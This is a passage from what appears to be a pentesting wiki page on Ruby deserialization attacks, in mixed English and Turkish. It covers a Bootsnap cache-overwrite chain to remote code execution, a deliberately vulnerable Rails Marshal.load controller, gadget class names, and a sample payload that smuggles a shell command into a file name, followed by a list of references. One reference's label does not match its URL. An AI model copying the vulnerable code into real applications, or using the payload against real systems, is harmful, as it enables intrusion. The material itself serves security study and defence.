This payload is compiled into binary Ruby code and concatenated with a carefully constructed cache key header (using the previously gathered metadata and the correct version number for Bootsnap).

- Overwrite and Trigger Execution
Using the arbitrary file write vulnerability, the attacker writes the crafted cache file to the computed location. Next, they trigger a server restart (by writing to tmp/restart.txt, which is monitored by Puma). During restart, when Rails requires the targeted file, the malicious cache file is loaded, resulting in remote code execution (RCE).



### Ruby Marshal exploitation in practice (updated)

Treat any path where untrusted bytes reach `Marshal.load`/`marshal_load` as an RCE sink. Marshal reconstructs arbitrary object graphs and triggers library/gem callbacks during materialization.


- Minimal vulnerable Rails code path:
```ruby
class UserRestoreController < ApplicationController
def show
user_data = params[:data]
if user_data.present?
deserialized_user = Marshal.load(Base64.decode64(user_data))
render plain: "OK: #{deserialized_user.inspect}"
else
render plain: "No data", status: :bad_request
end
end
end
```
- Gerçek zincirlerde görülen yaygın gadget sınıfları: `Gem::SpecFetcher`, `Gem::Version`, `Gem::RequestSet::Lockfile`, `Gem::Resolver::GitSpecification`, `Gem::Source::Git`.
- payloads içinde gömülü tipik yan etki göstergesi (unmarshal sırasında çalıştırılır):
```
*-TmTT="$(id>/tmp/marshal-poc)"any.zip
```
Where it surfaces in real apps:
- Rails cache stores and session stores historically using Marshal
- Background job backends and file-backed object stores
- Any custom persistence or transport of binary object blobs

Industrialized gadget discovery:
- Grep for constructors, `hash`, `_load`, `init_with`, or side-effectful methods invoked during unmarshal
- Use CodeQL’s Ruby unsafe deserialization queries to trace sources → sinks and surface gadgets
- Validate with public multi-format PoCs (JSON/XML/YAML/Marshal)


## Referanslar

- Trail of Bits – Marshal madness: Ruby deserialization exploitlerinin kısa tarihi: https://blog.trailofbits.com/2025/08/20/marshal-madness-a-brief-history-of-ruby-deserialization-exploits/
- elttam – Ruby 2.x Universal RCE Deserialization Gadget Chain: https://www.elttam.com/blog/ruby-deserialization/
- Phrack #69 – Rails 3/4 Marshal chain: https://phrack.org/issues/69/12.html
- CVE-2019-5420 (Rails 5.2 insecure deserialization): https://nvd.nist.gov/vuln/detail/CVE-2019-5420
- ZDI – RCE via Ruby on Rails Active Storage insecure deserialization: https://www.zerodayinitiative.com/blog/2019/6/20/remote-code-execution-via-ruby-on-rails-active-storage-insecure-deserialization
- Include Security – Discovering gadget chains in Rubyland: https://blog.includesecurity.com/2024/03/discovering-deserialization-gadget-chains-in-rubyland/
- GitHub Security Lab – Ruby unsafe deserialization (query help): https://codeql.github.com/codeql-query-help/ruby/rb-unsafe-deserialization/
- GitHub Security Lab – PoCs repo: https://github.com/GitHubSecurityLab/ruby-unsafe-deserialization
- Doyensec PR – Ruby 3.4 gadget: https://github.com/GitHubSecurityLab/ruby-unsafe-deserialization/pull/1
- Luke Jahnke – Ruby 3.4 universal chain: https://nastystereo.com/security/ruby-3.4-deserialization.html
- Luke Jahnke – Gem::SafeMarshal escape: https://nastystereo.com/security/ruby-safe-marshal-escape.html
- Ruby 3.4.0-rc1 release: https://github.com/ruby/ruby/releases/tag/v3_4_0_rc1
- Ruby fix PR #12444: https://github.com/ruby/ruby/pull/12444
- Trail of Bits – Auditing RubyGems.org (Marshal findings): https://blog.trailofbits.com/2024/12/11/auditing-the-ruby-ecosystems-central-package-repository/
- watchTowr Labs – Is This Bad? This Feels Bad — GoAnywhere CVE-2025-10035: https://labs.watchtowr.com/is-this-bad-this-feels-bad-goanywhere-cve-2025-10035/
- [OffSec – CVE-2025-59287 WSUS unsafe deserialization (blog)](https://www.offsec.com/blog/recent-vulnerabilities-in-redis-servers-lua-scripting-engine-2/)
- [PoC – tecxx/CVE-2025-59287-WSUS](https://github.com/tecxx/CVE-2025-59287-WSUS)

{{#include ../../banners/hacktricks-training.md}}
